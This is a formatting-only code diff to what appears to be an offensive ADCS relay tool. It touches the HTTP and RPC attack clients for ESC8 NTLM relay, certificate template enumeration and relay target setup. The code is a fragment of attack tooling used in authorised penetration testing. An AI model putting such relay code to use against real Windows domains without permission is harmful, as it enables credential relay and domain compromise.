@@ -210,20 +210,23 @@ class ADCSHTTPAttackClient(ProtocolAttack):
                 % repr(self.client.user)
             )
             return
-        
+
         if self.adcs_relay.enum_templates:
             from bs4 import BeautifulSoup
+
             self.client.request("GET", "/certsrv/certrqxt.asp")
             response = self.client.getresponse()
             content = response.read()
-            soup = BeautifulSoup(content, 'html.parser')
-            select_tag = soup.find('select', {'name': 'lbCertTemplate', 'id':'lbCertTemplateID'})
+            soup = BeautifulSoup(content, "html.parser")
+            select_tag = soup.find(
+                "select", {"name": "lbCertTemplate", "id": "lbCertTemplateID"}
+            )
             if select_tag:
-                option_tags = select_tag.find_all('option')
-                print("Templates Found for %s:" % repr(self.client.user)) 
+                option_tags = select_tag.find_all("option")
+                print("Templates Found for %s:" % repr(self.client.user))
                 for option in option_tags:
-                    value = option['value']
-                    split_value = value.split(';')
+                    value = option["value"]
+                    split_value = value.split(";")
                     if len(split_value) > 1:
                         print(split_value[1])
             return self.finish_run()
@@ -285,7 +288,10 @@ class ADCSHTTPAttackClient(ProtocolAttack):
         )
 
         if self.adcs_relay.archive_key:
-            logging.info("Trying to retrieve CAX certificate from file %s" % self.adcs_relay.archive_key)
+            logging.info(
+                "Trying to retrieve CAX certificate from file %s"
+                % self.adcs_relay.archive_key
+            )
             with open(self.adcs_relay.archive_key, "rb") as f:
                 cax_cert = f.read()
                 cax_cert = der_to_cert(cax_cert)
@@ -595,7 +601,10 @@ class ADCSRPCAttackClient(ProtocolAttack):
         self.adcs_relay.key = key
 
         if self.adcs_relay.archive_key:
-            logging.info("Trying to retrieve CAX certificate from file %s" % self.adcs_relay.archive_key)
+            logging.info(
+                "Trying to retrieve CAX certificate from file %s"
+                % self.adcs_relay.archive_key
+            )
             with open(self.adcs_relay.archive_key, "rb") as f:
                 cax_cert = f.read()
                 cax_cert = der_to_cert(cax_cert)
@@ -677,7 +686,7 @@ class Relay:
         timeout=5,
         enum_templates=False,
         debug=False,
-        **kwargs
+        **kwargs,
     ):
         self.target = target
         self.ca = ca
@@ -716,12 +725,16 @@ class Relay:
 
                 if self.enum_templates:
                     self.target += "certsrv/certrqxt.asp"
-                else:                
+                else:
                     self.target += "certsrv/certfnsh.asp"
             logging.info("Targeting %s (ESC8)" % self.target)
 
         target = TargetsProcessor(
-            singleTarget=self.target, protocolClients={"HTTP": self.get_relay_http_server, "RPC": self.get_relay_rpc_server}
+            singleTarget=self.target,
+            protocolClients={
+                "HTTP": self.get_relay_http_server,
+                "RPC": self.get_relay_rpc_server,
+            },
         )
 
         config = NTLMRelayxConfig()
